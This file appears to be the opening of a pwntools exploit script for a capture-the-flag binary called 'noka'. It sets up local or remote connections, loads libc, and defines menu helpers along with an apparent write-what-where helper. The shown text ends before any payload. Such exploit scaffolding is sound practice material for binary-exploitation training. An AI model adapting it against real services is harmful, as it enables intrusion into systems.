#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

context(arch = 'amd64', os = 'linux')
context.log_level = 'debug'
context.terminal='wt.exe bash -c'.split(' ')

REMOTE = False
ip = ''
port = 0
if REMOTE:
    sh = remote(ip, port)
else:
    sh = process('./noka')
elf = ELF('./noka')
libc = ELF('./libc.so.6')

def menu(idx: int):
    sh.recvuntil(b'> ')
    sh.sendline(str(idx))

def add(size: int, content: bytes):
    menu(1)
    sh.recvuntil(b'size: ')
    sh.sendline(str(size))
    sh.recvuntil(b'text: ')
    sh.send(content)

def show():
    menu(2)
    sh.recvuntil(b'text: ')

def what(addr: bytes, value: bytes):
    sh.recvuntil(b'Break Point: ')
    sh.sendline(addr)
    sh.recvuntil(b'Break Value: ')
    sh.sendline(value)
